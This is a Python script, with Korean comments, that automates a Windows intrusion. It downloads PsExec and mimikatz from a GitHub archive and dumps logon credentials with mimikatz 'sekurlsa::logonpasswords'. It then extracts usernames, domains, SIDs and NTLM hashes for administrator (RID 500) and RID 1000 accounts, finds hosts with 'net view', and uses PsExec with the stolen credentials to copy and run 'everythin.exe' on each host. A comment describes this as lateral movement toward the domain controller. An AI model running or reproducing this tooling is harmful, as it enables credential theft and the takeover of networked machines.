import os
import subprocess
from zipfile import ZipFile
from requests import get 


#--- Intro Setting
set_path = 'C:\module2'
os.mkdir(set_path)

#-- Files download
def download(url, file_name):
    with open(file_name, "wb") as file:   # open in binary mode
        response = get(url)               # get request
        file.write(response.content)      # write to file

if __name__ == '__main__':
   url = 'https://github.com/kimjinsoooo/DownloadFile/archive/refs/heads/main.zip'
   download(url, set_path + "\DownloadFile.zip")

#-- Python download


#-- 
#-- Files Unpack
Down_path = set_path + '\DownloadFile.zip'

with ZipFile(Down_path, 'r') as zip:
    zip.extractall(set_path)

#-- Files path setting
PsExec = set_path + 'DownloadFile-main\PsExec.exe'
Mimikatz = set_path + 'DonloadFile-main\mimikatz.exe'

### 크레딘셜 추출 및 저장
credential_path = set_path + '\GetCredential'
os.mkdir(credential_path)

os.system('C:\module2\DownloadFile-main\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\module2\GetCredential\Credential_output.txt')

#-- 추출된 크레덴셜 변수화 후 텍스트파일로 저장
f = open(credential_path + "\Credential_output.txt" ,'r', encoding='UTF-8')
Credential_log=open(credential_path + '\Credential_log.txt','w')
for line in f:
    if 'User Name         :' in line:
        Credential_log.write(line)
    if 'SID' in line:
        Credential_log.write(line)
    if 'Domain            :' in line:
        Credential_log.write(line)
    if '* NTLM     :' in line:
        Credential_log.write(line)    
Credential_log.close()
################################################################ SID 500 찾기
with open(credential_path + '\Credential_log.txt') as f:
    lines = f.readlines()
lines = [line.strip("\n") for line in lines]
Credential_use=open(credential_path + '\Credential_use_500.txt','w')
idx=0
count=0
for line in lines:
    if 'SID' in line:
        idx+=1
        SID_num=line.split("-")
        if (SID_num[len(SID_num)-1])=="500":
            username=lines[idx-3].split()
            domain=lines[idx-2].split()
            sid=lines[idx-1].split()
            ntlm=lines[idx].split()
            Credential_use.write(username[3])
            Credential_use.write(".")
            Credential_use.write(domain[2])
            Credential_use.write(".")
            Credential_use.write(sid[2])
            Credential_use.write(".")
            Credential_use.write(ntlm[3])
            Credential_use.write(".")
            count+=1
    else:
        idx+=1
Credential_use.close()
################################################################ SID 1000 찾기
with open(credential_path + '\Credential_log.txt') as f:
    lines = f.readlines()
lines = [line.strip("\n") for line in lines]
Credential_use=open(credential_path + '\Credential_use_1000.txt','w')
idx=0
count=0
for line in lines:
    if 'SID' in line:
        idx+=1
        SID_num=line.split("-")
        if (SID_num[len(SID_num)-1])=="1000":
            username=lines[idx-3].split()
            domain=lines[idx-2].split()
            sid=lines[idx-1].split()
            ntlm=lines[idx].split()
            Credential_use.write(username[3])
            Credential_use.write(".")
            Credential_use.write(domain[2])
            Credential_use.write(".")
            Credential_use.write(sid[2])
            Credential_use.write(".")
            Credential_use.write(ntlm[3])
            Credential_use.write(".")
            count+=1
    else:
        idx+=1
Credential_use.close()
################################################################  # 이름이 username인 텍스트 파일 만들고 해당 username 저장
log_txt = credential_path + '\Credential_log.txt'
with open(log_txt) as f:
    lines = f.readlines()
lines = [line.strip("\n") for line in lines]
output=open(credential_path + 'Credential_domains_500.txt','w')
for line in lines:
    if 'User Name' in line:
        user = line.split( )
        output.write(user[3] + '\n')
        output.write(line)
        out=open(user[3] + '.txt', 'w')
        out.write(user[3])
        out.write('\n')
out.close()
output.close()
################################################################  # 이름이 username인 텍스트 파일 만들고 해당 username 저장
log_txt = credential_path + '\Credential_log.txt'
with open(log_txt) as f:
    lines = f.readlines()
lines = [line.strip("\n") for line in lines]
output=open(credential_path + 'Credential_domains_1000.txt','w')
for line in lines:
    if 'User Name' in line:
        user = line.split( )
        output.write(user[3] + '\n')
        output.write(line)
        out=open(user[3] + '.txt', 'w')
        out.write(user[3])
        out.write('\n')
out.close()
output.close()
### Ip Discovery
#-- setting
IpDiscovery_path = set_path + '\IpDiscovery'
os.mkdir(IpDiscovery_path)

#-- net view 실행 후 출력 및 텍스트 파일로 저장
os.popen('chcp 65001') #txt에 저장할 때 한글 깨져서 영어로 결과값 저장
result = os.popen('net view').read() # net view 실행 후 결과값 result에 저장

#os.makedirs("%TEMP%\module2\IP DISCOVERY")
IpDiscovery_log_path = IpDiscovery_path + '\IpDiscovery_output.txt'
w = open(IpDiscovery_log_path, 'w')

for element in result:
    # element 가 문자형이 아니면 문자형으로 변환
    if type(element) != 'str' :
        element = str(element)
    # 텍스트 입력시 마지막에 줄바꿈 문자도 함께 포함
    w.write(element )
w.close()

#-- domain name 추출 및 저장
f=open(IpDiscovery_log_path,'r')
IpDiscovery_use_path=open(IpDiscovery_path + '\IpDiscovery_use.txt','w')

for line in f:
    if '\\' in line:
        IpDiscovery_use_path.write(line)
IpDiscovery_use_path.close()

#-- domain name앞에 \\ 제외하고 배열에 저장
list = []
f=open(IpDiscovery_path + '\IpDiscovery_use.txt','r')
for line in f:
    if '\\' in line:
        domain = line.split('\\')
        list.append(domain[2].split(' ')[0])
f.close()
print(list)

#-- 연결된 도메인(리스트 길이 만큼)에 psexec 실행 > 측면이동할 때는 밑에 텍스 파일 끝이 1000인 텍스트 파일 열고 DC로 이동할 때는 그대로 500인 텍스트 파일 열기
f=open('C:\module2\GetCredential\Credential_use_1000.txt','r', encoding='UTF-8')
line = f.readlines()
for i in range(len(list)-1):
    lines = line[0].split(".")
    return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe' + ' -s \\' + list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\everythin.exe')
f.close()

#'C:\module2\DownloadFile-main\PsExec.exe'
